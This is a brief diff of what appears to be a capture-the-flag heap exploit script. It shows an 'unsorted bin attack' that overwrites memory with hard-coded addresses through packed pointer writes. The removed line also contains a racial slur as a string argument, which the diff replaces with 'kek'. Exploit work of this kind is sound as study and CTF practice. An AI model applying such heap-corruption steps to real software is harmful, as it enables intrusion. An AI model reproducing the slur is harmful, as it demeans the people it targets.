@@ -82,7 +82,7 @@ def pwn():
 	modify_name(p64(set_age) + p64(0x6020c0-0x10))
 
 	# unsorted bin attack round 2
-	alloc(0xfff, 'niggatron')
+	alloc(0xfff, 'kek')
 	# same as before
 	modify_name(p64(0x6020a8)*3)
 
